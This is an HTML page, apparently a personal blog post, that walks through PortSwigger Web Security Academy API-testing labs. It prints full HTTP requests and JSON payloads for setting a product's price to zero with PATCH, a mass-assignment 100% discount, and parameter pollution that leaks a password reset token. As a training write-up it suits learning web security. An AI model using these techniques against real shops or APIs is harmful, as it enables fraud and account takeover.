@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>Muhammadsaid Alizada</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap" rel="stylesheet">
+  </head>
+
+<body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>API testing - Web Sec academy labs</title>
+    <style>
+      :root {
+        --text-color: #333;
+        --accent-color: #2962FF;
+        --background-color: #fff;
+        --card-color: #f8f9fa;
+        --border-color: #e0e0e0;
+        --meta-color: #666;
+      }
+      
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        line-height: 1.6;
+        color: var(--text-color);
+        background-color: var(--background-color);
+        margin: 0;
+        padding: 0;
+      }
+
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 40px 20px;
+      }
+
+      header {
+        margin-bottom: 2.5em;
+      }
+
+      h1 {
+        font-size: 2.2em;
+        margin-bottom: 0.3em;
+        font-weight: 600;
+      }
+
+      .contact-info {
+        margin: 0.8em 0;
+        color: var(--meta-color);
+      }
+
+      .contact-info a {
+        color: var(--accent-color);
+        text-decoration: none;
+      }
+
+      .contact-info a:hover {
+        text-decoration: underline;
+      }
+
+      .contact-info span {
+        margin: 0 8px;
+        color: var(--border-color);
+      }
+
+      nav {
+        margin: 1.8em 0;
+      }
+
+      nav a {
+        margin-right: 20px;
+        text-decoration: none;
+        color: var(--text-color);
+        font-weight: 500;
+        position: relative;
+      }
+
+      nav a:hover {
+        color: var(--accent-color);
+      }
+
+      nav a:after {
+        content: '';
+        position: absolute;
+        width: 0;
+        height: 2px;
+        bottom: -4px;
+        left: 0;
+        background-color: var(--accent-color);
+        transition: width 0.3s ease;
+      }
+
+      nav a:hover:after {
+        width: 100%;
+      }
+
+      .header-divider {
+        border: 0;
+        height: 1px;
+        background: var(--border-color);
+        margin: 1.5em 0;
+      }
+
+      .post-container {
+        background: var(--card-color);
+        border-radius: 8px;
+        padding: 2.5em;
+        margin-bottom: 3em;
+        border: 1px solid var(--border-color);
+      }
+
+      .post-title {
+        margin-top: 0;
+        font-size: 1.8em;
+      }
+
+      .post-meta {
+        color: var(--meta-color);
+        font-size: 0.9em;
+        margin-bottom: 1.5em;
+      }
+
+      .post-divider {
+        border: none;
+        height: 1px;
+        background: var(--border-color);
+        margin: 2em 0;
+      }
+
+      .post-content {
+        line-height: 1.7;
+      }
+
+      .post-content a {
+        color: var(--accent-color);
+        text-decoration: none;
+      }
+
+      .post-content a:hover {
+        text-decoration: underline;
+      }
+
+      .post-content code {
+        font-family: 'Fira Code', monospace;
+        background: rgba(0,0,0,0.05);
+        padding: 0.2em 0.4em;
+        border-radius: 3px;
+        font-size: 0.9em;
+        border: 1px solid rgba(0,0,0,0.1);
+      }
+
+      .post-content pre {
+        background: rgba(0,0,0,0.05);
+        padding: 1em;
+        border-radius: 5px;
+        overflow-x: auto;
+        border: 1px solid rgba(0,0,0,0.1);
+      }
+
+      .post-content pre code {
+        background: none;
+        padding: 0;
+        border: none;
+      }
+
+      .back-link {
+        color: var(--accent-color);
+        text-decoration: none;
+        font-weight: 500;
+        display: inline-block;
+        margin-top: 1em;
+      }
+
+      .back-link:hover {
+        text-decoration: underline;
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          padding: 30px 15px;
+        }
+        
+        .post-container {
+          padding: 1.5em;
+        }
+        
+        nav a {
+          margin-right: 15px;
+        }
+      }
+    </style>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <div class="container">
+    <header>
+  <div class="header-name-container">
+    <img src="http://localhost:4321/assets/i.jpeg" alt="Muhammadsaid Alizada" class="profile-photo">
+    <h1>Muhammadsaid Alizada</h1>
+  </div>
+  
+  <div class="contact-info">
+    <a href="mailto:ma8494@nyu.edu">ma8494@nyu.edu</a>
+    <span>|</span>
+    <a href="https://github.com/MSaidAlizada" target="_blank">GitHub</a>
+    <span>|</span>
+    <a href="https://www.linkedin.com/in/muhammadsaid-alizada/" target="_blank">LinkedIn</a>
+  </div>
+  
+  <nav>
+    <a href="http://localhost:4321/">home</a>
+    <a href="http://localhost:4321/posts">posts</a>
+    <a href="http://localhost:4321/notes">notes</a>
+    <a href="http://localhost:4321/assets/CV.pdf">cv</a>
+    <a href="mailto:ma8494@nyu.edu">contact</a>
+  </nav>
+  
+  <hr class="header-divider">
+</header>
+
+<style>
+  .header-name-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 0.5em;
+  }
+
+  .profile-photo {
+    width: 80px;
+    height: 80px;
+    border-radius: 4px;
+    object-fit: cover;
+    border: 2px solid var(--border-color);
+  }
+
+</style>
+
+    <div class="post-container">
+      <article class="post">
+        <h1 class="post-title">API testing - Web Sec academy labs</h1>
+        <p class="post-meta">Posted on April 29, 2025</p>
+        
+        <div class="post-content">
+          <p>This post will run through the labs on web sec academy by Portswigger related to API testing.</p>
+
+<h3 id="lab-exploiting-an-api-endpoint-using-documentation"><u>Lab: Exploiting an API endpoint using documentation</u></h3>
+<p>Usually API have documentation so that developers can understand how to use it and in this lab through checking endpoints that could have the documentation we find it is in /lab. We see there is a method to delete users and using the API we can get the curl command to delete the user carlos which we can run after logging into our own account.</p>
+
+<h3 id="lab-finding-and-exploiting-an-unused-api-endpoint"><u>Lab: Finding and exploiting an unused API endpoint</u></h3>
+<p>Sometimes an endpoint won’t be blocked and we can use those to exploit the app. We see an api request is sent when we want to add to cart using the GET method. When we send the same request with the OPTIONS method we get this response:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 405 Method Not Allowed
+Allow: GET, PATCH
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 20
+
+"Method Not Allowed"
+</code></pre></div></div>
+<p>This shows us that there is only two methods allowed and one which we can use to update. We can log in to our account then try to add the item and capture it’s request.
+This the original request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/products/1/price HTTP/2
+Host: 0aca0033049985f280c83aba00a8003c.web-security-academy.net
+Cookie: session=taQwVVneg8qlpbqy34NYq7bg3jDaeOvO
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0aca0033049985f280c83aba00a8003c.web-security-academy.net/product?productId=1
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+Te: trailers
+</code></pre></div></div>
+<p>But we will need to modify it so that it is instead a PATCH method and from a previous response we know that the item has two parameters, price and message. We can instead add json to our request to change the price to 0 and we will have to change the content type header to application/json. This will be our resulting request.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PATCH /api/products/1/price HTTP/2
+Host: 0aca0033049985f280c83aba00a8003c.web-security-academy.net
+Cookie: session=taQwVVneg8qlpbqy34NYq7bg3jDaeOvO
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0aca0033049985f280c83aba00a8003c.web-security-academy.net/product?productId=1
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+Te: trailers
+Content-Type: application/json
+Content-Length: 66
+
+{"price":0,"message":"19 people are watching this item right now"}
+</code></pre></div></div>
+<p>Now this succesfully changes the price of the item and we can add it to our cart and buy it.</p>
+<h3 id="lab-exploiting-a-mass-assignment-vulnerability"><u>Lab: Exploiting a mass assignment vulnerability</u></h3>
+<p>This vulnerability occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer. In this lab we can look through requests to try find any mass assignment, and we see once we add something to our cart and go to the card a GET request is sent to api/checkout and this is the response we get:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 153
+
+{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
+</code></pre></div></div>
+<p>As you can see above there is a few parameters we can see that we can change to get the product for free, one of these being the perecentage in chosen discount. Now when we click Place Order it sends a POST request to the same endpoint and it is sent with this json:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"chosen_products":[{"product_id":"1","quantity":1}]}
+</code></pre></div></div>
+<p>We can however change it to the json we recieved in the GET request but with the percentage parameter modified as such:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
+</code></pre></div></div>
+<p>This succesfully allows us to order the product for free.</p>
+<h3 id="lab-exploiting-server-side-parameter-pollution-in-a-query-string"><u>Lab: Exploiting server-side parameter pollution in a query string</u></h3>
+<p>This vulnerability occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. You can use ‘#’ to truncate a query and ‘&amp;’ to add a paremeter to the query. For this lab as we look around the website we find there is a forgot password feature and when you open this page it also has a forgotPassword.js which by looking through we can see that it sends an email with a reset token and using /forgotpassword?reset_token={the reset token you got} you can reset your password. Now we can also test the POST request that is sent when you submit this form for server side parameter pollution. By adding %23 we can truncate the request in the server side which gives us:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"error": "Field not specified."
+</code></pre></div></div>
+<p>Now by adding a field parameter using %26 we can try set it to a random letter:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"type":"ClientError","code":400,"error":"Invalid field."}
+</code></pre></div></div>
+<p>Then how about we try reset_token which we could be a field from the javascript file and it gives us:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"result":"k56a6yc05darjqpn1tvhi7i77nq94nld","type":"reset_token"}
+</code></pre></div></div>
+<p>Now we can use this reset token to change our password and delete users.</p>
+
+        </div>
+        
+        <hr class="post-divider">
+        
+        <a href="http://localhost:4321/posts" class="back-link">← All Posts</a>
+      </article>
+    </div>
+  </div>
+</body>
+</html>
+</body>
+</html>
